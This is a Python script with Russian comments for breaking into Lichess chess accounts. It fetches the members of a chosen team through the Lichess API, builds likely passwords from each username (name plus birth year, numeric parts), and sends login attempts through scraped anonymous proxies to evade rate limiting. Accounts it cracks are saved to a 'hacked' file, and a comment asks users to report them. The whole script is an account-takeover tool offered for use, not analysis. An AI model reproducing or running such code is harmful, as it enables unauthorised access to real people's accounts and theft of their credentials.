# Для работы программы, необходимо установить модуль requests. Если у вас получилась ошибка, то у вас нету этого модуля.
import requests, time, json
from config import *

# По желанию, чтобы можно было взламывать по дате или году рождения, указанном в профиле, можно загрузить у фиша еще одну программу под именем tracker.py
# Функции в модуле: tracker.get_birthday(username) возвращает дату рождения, если написана в профиле, tracker.get_year(username) - год рождения
import tracker, r_e

# Заходим через прокси
def proxy(user, password):
    r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=2000&country=all&ssl=all&anonymity=elite")
    proxy_list = r.text.split("\r\n")
    for p in proxy_list:
        proxies = {"http" : "http://" + p, "https" : "http://" + p}
        try:
          n = requests.post("https://lichess.org/login", data={"username" : user, "password" : password, "remember" : "true"}, headers={"X-Requested-With" : "XMLHttpRequest", "User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"}, proxies=proxies, timeout=2)
          return n
        except: time.sleep(0.2)
    return 0

# Это функция получения цифр с логина
def getNumericPart(string):
    res = ''
    for i in string:
        if (i.isnumeric()): res = res + i
    return res

def getNamePart(s):
    res = s[0]
    a = 'qwertyuiopasdfghjklzxcvbnm'
    for i in range(1, len(s)):
        if (a.find(s[i]) == -1): return res
        res = res + s[i]
    return res

# Функция превращения даты (рождения) из формата ДД-ММ-ГГГГ в формат ДД-ММ-ГГ
def trans(s):
    return s[0] + s[1] + s[2] + s[3] + s[6] + s[7]

# Здесь написать ID команды, прога будет взламывать всех участников команды
team = input(magenta + "[?] Введите ID команды: ")

# Получаем список людей для взлома
# Это может занять некоторое время
print(yellow + "[..] Получаем список, это может занять некоторое время...")
users = requests.get("https://lichess.org/api/team/"+team+"/users").text.split("\n")

# Выводим сообщение, что список готов
print(green + "[+] Список пользователей получен!")

#users = open("mk").read().split("\n")

k = 1
# Начинаем перебор
for user in users:

#   Получаем ник участника
    username = json.loads(user).get("username")

    if (len(username) < 4): continue
    if (not k): continue
#   Здесь писать список паролей, которые будут перебиратся
#   Самые популярные пароли: username (такой же как и логин), '123456', '123456789' и getNumericPart(username) (цифры с логина)
#   Писать сразу больше двух паролей не рекомендуется

    s = username[len(username)-4] + username[len(username)-3] + username[len(username)-2] + username[len(username)-1]
    if (not s.isnumeric()): continue
    n = int(s)
    if (n < 1940) or (n > 2017): continue
    k = getNamePart(username)
    passwords = []
    if (len(k) > 2): passwords.append(k + str(n))
    if (len(getNumericPart(username)) == 8): passwords.append(getNumericPart(username))

    for password in passwords:

#       Проверка пароля на правильность (личесс запрещает пароли меньше 4 символов)
        if (not password): continue
        if (len(password) < 4): continue
        if (password == username): continue

#       Взламываем
        r = proxy(username, password)
#        r = requests.post("https://lichess.org/login", data={"username" : user, "password" : password, "remember" : "true"}, headers={"X-Requested-With" : "XMLHttpRequest", "User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"})

#       Выводим статус взлома
#       200 означает что аккаунт взломан, 401 что взломать не получилось, 429 что личесс блокирует ваши запросы
        print(type(r))
        print(r, username, password)

#       Если взлом удался, то пишем аккаунт в файл, чтобы не потерять
#       Просьба сообщать обо всех взломанных аккаунтах
        if (r == 200): open("hacked3_real", "a").write(username + " " + password + "\n")

#       Ждем 5 секунд, иначе личесс не даст взламывать. Время можно увеличить.
        time.sleep(5)
        if k % 10 == 0:
            time.sleep(20)
